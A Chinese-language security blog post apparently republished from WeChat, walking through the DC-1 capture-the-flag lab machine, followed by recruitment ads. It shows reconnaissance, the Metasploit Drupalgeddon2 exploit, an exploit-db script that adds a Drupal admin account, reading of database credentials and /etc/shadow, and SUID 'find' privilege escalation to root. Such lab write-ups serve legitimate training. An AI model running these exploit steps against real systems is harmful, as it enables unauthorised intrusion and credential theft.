> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7tV3M_0m5T6GnNvYtSWgFQ)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**搭建测试靶机**_

下载地址：https://www.five86.com/dc-1.html

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAWTgvl3hRr9yc4b84amOibcUMviaG63mnkZ4FZy0BM7g107shHN3OJrbg/640?wx_fmt=png)

_**No.2  
**_

_**运行靶机**_

  

将靶机 DC-1 与 kali 都以 NAT 模式连接网络

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAfQuGiaJkS6WsOpNYIXWSZFhJuht7qg0L7A0MwOjyCf2MmN13RY2haQg/640?wx_fmt=png)

我们用 netdiscover -r 192.168.188.0/24 扫描 ip，得到靶机 ip 192.168.188.156

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAKgNGR39ROwejEojICa9jOe4Czib989LhncYReFYIG0Wr6OzEd3AesLA/640?wx_fmt=png)

则靶机 DC-1 ip：192.168.188.156  
攻击机 kalilinux ip：192.168.188.144

_**No.3  
**_

_**信息收集**_

使用 nmap 扫描

```
Namp -A 192.168.188.156
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAYeUD1fJYwtwa6G3VuSrpE4JJT8ahF2VBkzQgZ2YKN1DuEwTtz2Ho4w/640?wx_fmt=png)

开放了 22 的 ssh 80 的 http apache 111 的 rpcbind 等等。

```
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
```

访问 80 端口，查看 CMS 版本。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAic0MBFkFictvmiccqE1DU1lzLr83cHqNZajicz2RNWUjTFfojmpg83c1mw/640?wx_fmt=png)

```
Server：Apache/2.2.22 (Debian)
Vary：Accept-Encoding
X-Generator ：Drupal 7 (http://drupal.org)
X-Powered-By ：PHP/5.4.45-0+deb7u14
```

_**No.4  
**_

_**漏洞利用**_

**获取 flag1**

1. 在 msf 中看看有没有 Drupal 7 的 exp

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbA6C4BktOr61iczQCB1Flcx0t5TTqCLpkIrBugydvVe8rY5WQXjQJyVcQ/640?wx_fmt=png)

使用 exploit/unix/webapp/drupal_drupalgeddon2 模块打，配置该模块。

```
Use exploit/unix/webapp/drupal_drupalgeddon2
Show options //查看需要配置项
```

设置远程主机的 IP 为靶机的 IP 地址

```
set rhosts 192.168.188.156
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAicWvZP1wGhX8BKfqPkkmHd55peIoFDA0fvTRRwFxhfWC3mqZDehk60g/640?wx_fmt=png)

开始利用

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAXn3qPP2ia3A9R21c2xeJrCIibSibSde0LcW7lBh0nPUS2LokvXricP2jBQ/640?wx_fmt=png)

使用 ls 查看目录，拿到 flag1.txt

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAxFeibUP8TeCaeXZmjZSic9MsKU6enydY5IUbytiaxYWJuD9a1EfricQWpA/640?wx_fmt=png)

**获取 flag2**

看看 flag 文件，应该有提示信息。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbADT5DVskMjxw5khGevbhPdGtkoyZIZxGBztVNKAIN9rdU9jl2ASB62Q/640?wx_fmt=png)

按照提示信息，去看看它的配置文件。文件在 sites/default/setting.php 中  
首先进入交互式 shell：python -c 'import pty; pty.spawn("/bin/bash")' 。//ma 耶成功了，注意大小写啊

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAeWTr37xzjMRibtSiblusHPkm2Ae22y6pJeZfj2aXwwRPqBTp2VsKYwPQ/640?wx_fmt=png)

使用 cat setting.php 命令打开，看到有数据库信息和 flag2。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAicZsCu5HoQHCBibIs0XAgQQicS1XwjJIOh1LtgtQj7VgnTw0c60Wmv3yw/640?wx_fmt=png)

**获取 flag3**

根据 flag2 中提示，我们使用数据库信息去进入数据库中拿后台的账号密码。  
使用 mysql -udbuser -p 输入密码 R0ck3t 登录 mysql

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAufsAg7TlSbc55HaIibpsiaVpsYRNSVqFNicbTicsicAPiciaibQNMs1RIRjp8Q/640?wx_fmt=png)

```
mysql>use drupaldb;                # 使用drupaldb数据库
mysql>show tables;                 # 查看数据库内的表
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbA2ZWY71XZZPhCnaDUKib6SGFI3PRu7nlyvQSZ9BYjQ7tRKpWfyHKlY6g/640?wx_fmt=png)

可以看到一个 user 的表

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAaQC6E0FC3oe95ntdo2cwqU4Irx666Tz0H3eNNMfvpNDiaBWeHv6Lc7w/640?wx_fmt=png)

select 语句查询，找到可用于登录的用户 admin 和密码密文。select * from users;

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAQSSRmgXshUwMKAMV9c2XshGQ1OKZQLGrC8YwxwPG7ms4dDl5DibjZcQ/640?wx_fmt=png)

发现破解不了，我们去 exploitdb 中看看有没有攻击 admin 的脚本。

```
searchsploit drupal
```

在 exploitdb 中有一个针对 Drupal 7 版本的攻击脚本，可以增加一个 admin 权限的用户。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAdaS30wzKw0UFVK7yFuwO43y1V1d07uTXLzXvUyFtibjwaQPjv99QQ1A/640?wx_fmt=png)

```
python exploits/php/webapps/34992.py -t 192.168.236.136 -u admin1 -p admin1 利用一下
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAia1NzCDFCWv0ySVaIQ5YNGowIribI88Kafiaic6Cvb6lwd4pFu16UHq0mQ/640?wx_fmt=png)

使用 admin1 admin1 登录后台 在 Content 中拿到 flag3

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAZDfswmoGZPTJToWoaYkfd6RYts5tp8AHIPeIOvnChiawwEDzcravNmw/640?wx_fmt=png)

**获取 flag4**

根据 flag3 的信息我们知道

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAgpRn2RKJ1CyMRXU8cAxDBcDibeWcBtsCpcb9PiaFKlFHpCXss6w3SrTQ/640?wx_fmt=png)

应该要查看 shadow 文件，并使用 SUID 命令提权。  
使用以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

我们回到 shell 中使用 find / -user root -perm -4000 -print 2>/dev/null，命令查找具有 root 权限的 SUID 的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbA0KgX3jB8d59ZJzLX92r6O5kvicNv0XWh5icJpu9fncIj4CrpSE8fRocg/640?wx_fmt=png)

```
$ find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

我们随便找一个命令进行利用，我们就找 find，先查看其信息，发现其确实是 root 用户权限的 SUID 的文件

```
find . -exec /bin/sh ; -quit
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAO2HibZqB0NLNibImxiafr1WWxCA0cKM18PbHGQX7mVJOxhTFzRIQZVkmw/640?wx_fmt=png)

拿到了 root 权限，查看 shadow 文件  
发现 flag4，并且 flag4 是一个用户，flag4 用户密码可以使用 ssh 登录进行爆破，先不爆破。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAyjOAQcrgPmylyUs1u4GHx8lvYMnN9pI9Xds1AgCvdFJtLf7dzJ29Ew/640?wx_fmt=png)

使用 root 用户直接查找

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAS2gaicqHKFHw0x13XxxYTvwibvCUib1Gbuy5licRZRPr9PQ0v4omIkibKgw/640?wx_fmt=png)

find -name “flag4.txt” 命令拿到 flag4.

**获取 flag5**

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbApe0zTwtX5Gnff9roGlHicTTyYvC8qghEeZKxWUHX44QemDXVWGCWM7w/640?wx_fmt=png)

使用 find 配合正则进行一个模糊搜索。  
find * -name "*.txt" 搜索所有. txt 的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUmicyPea7QkS9RrYbGicTjbAyke7MzkibRAMTDFlZASlCTzWhzSLpib5ia4TrDqauAobU86UJPLsuGUEQ/640?wx_fmt=png)

成功拿到 flag5，thfinalflag.txt。

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXsXUiaDfpQ6MaRHMZ6YOVmJcTib286GQcKicWTGz6ayWdjqYrzq36VzSq6TnRORY3GKoHntMQ2LBkKg/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWUFSUTshk23sjjpXhJrMu2z6MIL9pdkYkm0wicXRrgNLWvr04znZtqs8wexe5qbZxyOzRerwpSotg/640?wx_fmt=jpeg)